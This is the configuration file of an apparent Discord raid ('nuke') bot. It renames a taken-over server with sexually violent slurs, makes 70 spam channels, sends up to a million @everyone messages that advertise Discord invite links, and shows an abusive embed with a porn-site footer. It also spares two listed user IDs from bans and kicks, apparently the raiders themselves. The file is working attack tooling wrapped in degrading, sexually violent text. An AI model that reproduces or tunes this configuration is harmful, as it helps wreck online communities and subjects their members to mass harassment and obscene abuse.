# DONT TOUCH IT

SERVER_CONFIG = {
    "new_name": "RAPED BY CRIMINALS",  
    "new_description": "FUCKED BY CRIMINALS",  
    "new_icon": "https://i.imgur.com/aL0Q8ty.jpeg"
}


WEBHOOK_CONFIG = {
    "default_name": "FUCKED BY CRIMINALS",   
}


AUTO_RAID_CONFIG = {
    'num_channels': 70,  
    'channel_type': 'text',   
    'channel_name': 'FUCKED BY CRIMINALS',  
    'num_messages': 1000000,   
    'message_content': '# ♡ྀི ₊⋆｡˚ ☁︎ || @everyone @here || FUCKED BY RDX AND CRIMINALS ۶ৎ˚｡⋆｡˚☽˚｡⋆ **RAPPED BY RDX AND CRIMINALS** ˚｡⋆｡˚☽˚｡⋆⋆ ִֶָ ๋𓂃 ⋆ᡣ𐭩 ── ୨୧ ── જ⁀➴ HTTPS://DISCORD.GG/OPCCHILL & https://discord.gg/K6TZeCFk & https://discord.gg/e3dCwZxf 𓏲⋆ ִֶָ ๋𓂃 ⋆ᡣ𐭩 ── ୨୧ ── જ⁀➴ || @everyone @here ||' 
}

NO_BAN_KICK_ID = {
    938318480355246140,       
    1294173092234526770,     
}

BOT_PRESENCE = {
    "type": "watching", 
    "text": "text" 
}

EMBED_CONFIG = {
    "title": "CRIMINALS DADDY HERE",    
    "description": "SUCK DADDY'S DICK BITCH",            
    "color": 0xFF5733,      
    "fields": [
        {"name": ".GG/OPCCHILL", "value": ".GG/OPCCHILL", "inline": False},     
        {"name": ".GG/OPCCHILL", "value": ".GG/OPCCHILL", "inline": False},
        {"name": ".GG/OPCCHILL", "value": ".GG/OPCCHILL", "inline": False},    
    ],
        "footer": "WWW.PORNHUB.COM",     
}
